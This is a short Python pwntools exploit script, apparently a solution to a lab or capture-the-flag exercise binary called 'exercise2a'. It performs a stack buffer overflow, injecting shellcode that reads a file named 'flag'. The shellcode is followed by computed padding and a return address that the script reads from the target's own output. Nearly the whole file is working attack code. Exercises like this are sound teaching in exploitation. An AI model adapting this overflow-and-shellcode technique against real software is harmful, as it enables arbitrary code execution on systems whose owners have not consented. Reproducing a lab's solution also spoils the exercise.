#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise2a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
b *check_authorization
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

exploit = b""
#constant size buffer
size_buffer = 160
#shellcode that performs cat file
shellcode = asm(pwnlib.shellcraft.amd64.linux.cat("flag", fd=1))
#the padding is based on checking the stack
padding = b"\x00"*(size_buffer - len(shellcode) + 5*16 + 8 - 4*16)
address = p64(int(r.recvline()[:-1].decode("utf-8"), 16)) +b"\x00\x00"
exploit += shellcode + padding + address


r.sendline(exploit)
print(r.recvline())
print(r.recvline())
print(r.recvline())


